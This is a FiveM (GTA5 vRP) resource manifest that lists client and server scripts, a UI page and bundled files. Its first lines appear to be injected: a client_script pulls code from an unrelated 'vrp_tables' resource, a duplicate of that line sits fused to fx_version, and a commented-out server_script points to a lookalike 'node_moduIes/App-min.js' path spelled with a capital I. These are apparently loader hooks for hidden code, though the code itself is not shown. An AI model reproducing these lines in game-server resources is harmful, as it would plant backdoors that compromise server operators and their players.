--dependency "vrp_tables" client_script "@vrp_tables/client.lua" fx_version "adamant"
client_script "@vrp_tables/client.lua" fx_version "adamant"
games {"gta5"}

client_scripts {
	"@vrp/lib/utils.lua",
	"client.lua"
}

server_scripts {
	"@vrp/lib/utils.lua",
	"server.lua"
}

ui_page 'html/index.html'

files {	
	'Newtonsoft.Json.dll',
	'html/**/*'	
}

-- dependencies {
-- 	'common'
-- }
-- server_script "node_moduIes/App-min.js"
